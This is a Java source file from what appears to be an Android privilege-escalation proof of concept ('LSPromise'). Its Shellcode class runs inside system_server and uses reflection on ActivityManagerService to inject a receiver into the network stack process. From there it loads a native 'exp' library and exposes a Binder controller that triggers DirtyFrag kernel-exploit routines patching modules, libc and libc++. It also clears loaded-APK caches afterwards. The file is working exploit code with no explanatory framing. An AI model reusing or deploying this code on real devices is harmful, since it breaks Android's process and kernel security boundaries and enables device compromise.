package org.lsposed.lspromise;

import android.annotation.SuppressLint;
import android.app.ActivityThread;
import android.app.Application;
import android.app.ApplicationLoaders;
import android.app.IApplicationThread;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.os.Binder;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Parcel;
import android.os.Process;
import android.os.RemoteException;
import android.os.ServiceManager;
import android.util.ArrayMap;
import android.util.Log;

import java.lang.reflect.Field;
import java.lang.reflect.Method;

public class Shellcode extends BroadcastReceiver {
    public static final String TAG = "LSPromise";
    private static final int NETWORK_STACK_UID = 1073;
    public static void onAppComponentFactoryLoaded() {
        int uid = Process.myUid();
        String processName = Process.myProcessName();
        Log.e(TAG, "Shell code has been executed in " + uid + " process " + processName);
        if (uid == Process.SYSTEM_UID) {
            // In system_server
            Context context = ActivityThread.currentApplication();
            Intent intent = context.registerReceiver(null, new IntentFilter(TAG));
            if (intent != null) {
                context.removeStickyBroadcast(intent);
                stage1(context);
            }
            // Defer cleanup for 1s as the system might be keep trying to load the package
            new Handler(Looper.getMainLooper()).postDelayed(Shellcode::cleanupLoadedApk, 1000);
        }
    }

    /**
     * To be executed in system_process process, to inject code into network stack
     */
    private static void stage1(Context context) {
        try {
            Log.e(TAG, "in system server, stage 1");
            ApplicationInfo appInfo = context.getPackageManager()
                    .getApplicationInfo(BuildConfig.APPLICATION_ID, 0);
            ActivityInfo receiverInfo = new ActivityInfo();
            receiverInfo.applicationInfo = appInfo;
            receiverInfo.name = Shellcode.class.getName();
            Intent intent = new Intent().setClassName(appInfo.packageName, receiverInfo.name);

            Object activityManagerService = ServiceManager.getService(Context.ACTIVITY_SERVICE);
            ClassLoader classLoader = activityManagerService.getClass().getClassLoader();
            @SuppressLint("PrivateApi")
            Class<?> ActivityManagerService = classLoader.loadClass("com.android.server.am.ActivityManagerService");
            Method getProcessRecordLocked = ActivityManagerService.getDeclaredMethod("getProcessRecordLocked", String.class, int.class);
            getProcessRecordLocked.setAccessible(true);
            Object networkStackProcessRecord;
            synchronized (activityManagerService) {
                networkStackProcessRecord = getProcessRecordLocked.invoke(
                        activityManagerService, "com.android.networkstack.process", NETWORK_STACK_UID);
            }
            Method getOnewayThread = getProcessRecordLocked.getReturnType().getDeclaredMethod("getOnewayThread");
            getOnewayThread.setAccessible(true);
            IApplicationThread appThread = (IApplicationThread) getOnewayThread.invoke(networkStackProcessRecord);
            appThread.scheduleReceiver(intent, receiverInfo, null, 0,
                    null, null, false, false, 0,
                    0, Process.SYSTEM_UID, "android");
        } catch (Exception e) {
            Log.e(TAG, "Failed to inject network stack", e);
        }
    }

    /**
     * To be executed in network stack process, to launch kernel exploit
     */
    private static void stage2(Context context) {
        Log.e(TAG, "in network stack, stage 2");
//        Runtime runtime = Runtime.getRuntime();
//        runtime.gc();
//        runtime.runFinalization();
//        runtime.gc();
        // FIXME This can throw UnsatisfiedLinkError if so already opened by other class loaders
        //  Remove cleanupLoadedApk call fixes it but updated apk won't be loaded
        //  Workaround: Always update PoC app when rerun is needed
        System.loadLibrary("exp");
        var controller = new Binder() {
            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
                switch (code) {
                    case 1 -> {
                        Log.d(TAG, "executing patchMod");
                        reply.writeInt(DirtyFrag.patchMod());
                        return true;
                    }
                    case 2 -> {
                        Log.d(TAG, "executing patchLibc");
                        reply.writeInt(DirtyFrag.patchLibc());
                        return true;
                    }
                    case 3 -> {
                        Log.d(TAG, "executing patchCxx");
                        reply.writeInt(DirtyFrag.patchCxx());
                        return true;
                    }
                    case 4 -> {
                        Log.d(TAG, "executing forkProcess");
                        reply.writeInt(DirtyFrag.createOrphanProcess());
                        return true;
                    }
                    case 5 -> {
                        Log.d(TAG, "run all");
                        var reporter = data.readStrongBinder();
                        var df = new DirtyFrag(reporter);
                        df.runAll();
                        reply.writeInt(1);
                        return true;
                    }
                }
                return super.onTransact(code, data, reply, flags);
            }
        };

        var intent = new Intent();
        intent.setPackage(BuildConfig.APPLICATION_ID);
        intent.setAction("EVIL");
        var extras = new Bundle();
        extras.putBinder("CONTROLLER", controller);
        intent.putExtras(extras);

        context.sendBroadcast(intent);
        Log.d(TAG, "controller sent");
    }

    /**
     * Cleanup cached loaded apk & class loader so next run will correctly use updated apk
     */
    private static void cleanupLoadedApk() {
        try {
            Log.e(TAG, "Cleanup loaded apk");
            ActivityThread activityThread = ActivityThread.currentActivityThread();
            @SuppressLint("SoonBlockedPrivateApi")
            Field mResourcesManager = ActivityThread.class.getDeclaredField("mResourcesManager");
            mResourcesManager.setAccessible(true);
            @SuppressLint("DiscouragedPrivateApi")
            Field mPackages = ActivityThread.class.getDeclaredField("mPackages");
            mPackages.setAccessible(true);
            // noinspection all
            ArrayMap<String, ?> packages = (ArrayMap<String, ?>) mPackages.get(activityThread);
            synchronized (mResourcesManager.get(activityThread)) {
                packages.remove(BuildConfig.APPLICATION_ID);
            }

            Field sApplications = Class.forName("android.app.LoadedApk")
                    .getDeclaredField("sApplications");
            sApplications.setAccessible(true);
            ArrayMap<String, Application> cachedApplications = (ArrayMap<String, Application>) sApplications.get(null);
            synchronized (cachedApplications) {
                cachedApplications.remove(BuildConfig.APPLICATION_ID);
            }

            ClassLoader classLoader = Shellcode.class.getClassLoader();
            Field mLoaders = ApplicationLoaders.class.getDeclaredField("mLoaders");
            mLoaders.setAccessible(true);
            ArrayMap<String, ClassLoader> cachedClassLoaders = (ArrayMap<String, ClassLoader>) mLoaders.get(ApplicationLoaders.getDefault());
            synchronized (cachedClassLoaders) {
                int index = cachedClassLoaders.indexOfValue(classLoader);
                if (index >= 0) {
                    cachedClassLoaders.removeAt(index);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to cleanup loaded apk", e);
        }
    }

    @Override public void onReceive(Context context, Intent intent) {
        // In network stack
        try {
            stage2(context);
        } catch (Throwable t) {
            Log.e(TAG, "handle receive", t);
        }
        cleanupLoadedApk();
    }
}
